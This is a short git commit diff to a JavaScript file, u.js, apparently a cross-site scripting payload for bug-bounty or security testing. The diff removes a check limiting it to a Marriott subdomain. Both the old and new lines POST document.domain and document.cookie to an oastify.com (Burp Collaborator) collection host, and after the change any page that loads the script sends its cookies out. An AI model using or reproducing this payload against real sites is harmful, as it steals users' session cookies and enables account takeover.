ae6f16140e9bd1cbd80f26d7a380469925250fb1
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2023-04-06 22:39:50 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,7 +1,6 @@
-if(document.domain=="cruise-with-points.marriott.com"){
-fetch('https://vsrbans5xq18rfeg6i0zor752w8mwb.oastify.com', {
+fetch('https://fj23ivvlkop85cdl2kphnie2zt5jt8.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
 body:document.domain+document.cookie
 });
-}
+
